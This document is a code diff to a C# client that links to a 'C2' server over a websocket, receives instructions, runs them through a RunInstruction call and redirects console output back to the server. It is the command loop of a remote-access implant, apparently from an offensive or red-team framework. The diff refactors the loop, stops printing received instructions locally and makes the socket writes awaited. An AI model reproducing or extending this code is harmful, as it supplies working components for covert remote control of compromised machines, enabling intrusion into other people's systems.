@@ -47,48 +47,48 @@ namespace Application
             // connect to the websocket in configuration
             Console.WriteLine("Linking to the C2 ({0}) via websocket... ",c2url);        
             webSocket.ConnectAsync(new Uri(c2url), CancellationToken.None).Wait();
+            bool wsstatus = true;
             Console.WriteLine("The websocket connection is successfully established.");
             // create a new socket IO and assign to instructionIO
             instructionIO = new SocketWriter(webSocket);
+            instructionIO.WriteLine("Socket IO initiated.");
+            Program.ConsoleIOSet(instructionIO);
             
             try
                 {
                     while (webSocket.State == WebSocketState.Open)
                     {
+                        
+
                         // receiving the instruction from websocket
                         byte[] rbuffer = new byte[4000];
                         var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(rbuffer), CancellationToken.None);
                         string instruction = Regex.Replace((string)Encoding.UTF8.GetString(rbuffer),"\0", string.Empty);
-                        Console.WriteLine("Got an instruction:\n{0}",instruction);
+                        
+                        
+                        //Console.WriteLine("Got an instruction:\n{0}",instruction);
 
                         // processing the instruction
                         //string data = InstructionProcess(instruction);
-                        InstructionProcess(instruction, instructionIO);
+                        Program.RunInstruction(instruction);
 
                         if (result.MessageType == WebSocketMessageType.Close)
                         {
-                            Console.WriteLine("Socket is closing...");
-                            await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);                    
+                            Console.Error.WriteLine("Socket is closing...");
+                            await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);                                                
+                            Program.ConsoleIOSet(Console.Out);
                         }
                     }
                 }
             catch (Exception e)
             {
-                Console.WriteLine("The service stopped responding: {0}", e);
+                Console.Error.WriteLine("The service stopped responding: {0}", e);
+                Program.ConsoleIOSet(Console.Out);
+                wsstatus = false;
+            }
+            if (! wsstatus) {
                 await webSocket.CloseOutputAsync(WebSocketCloseStatus.NormalClosure, string.Empty, CancellationToken.None);
-            }
-            
-        }
-
-        public void InstructionProcess(string instruction, TextWriter instructionIO) {
-            try
-            {
-                Program.RunInstruction(instruction, instructionIO);       
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("Oh snap! " + e.Message);
-            }
+            }            
         }
     }
 
@@ -98,24 +98,26 @@ namespace Application
         
         public SocketWriter(ClientWebSocket ws) {
             this.webSocket = ws;
-        }
-
+        }        
         public override Encoding Encoding
         {
             get { return Encoding.Default; }
         }
         public override void Write(string data)
         {
+            Send(data).Wait();
+        }
+        public override void WriteLine(string data)
+        {
+            Send(data).Wait();
+        }
+        private async Task Send(string data) {
             // get bytes of the data
             byte[] buffer_bytes = Encoding.UTF8.GetBytes(data+"\n");
 
             // send the data with buffer header
-            webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);
-            
-        }
-        public override void WriteLine(string data)
-        {
-            Write(data);
+            //webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);            
+            await webSocket.SendAsync(new ArraySegment<byte>(buffer_bytes), WebSocketMessageType.Text, true, CancellationToken.None);            
         }
     }
 }
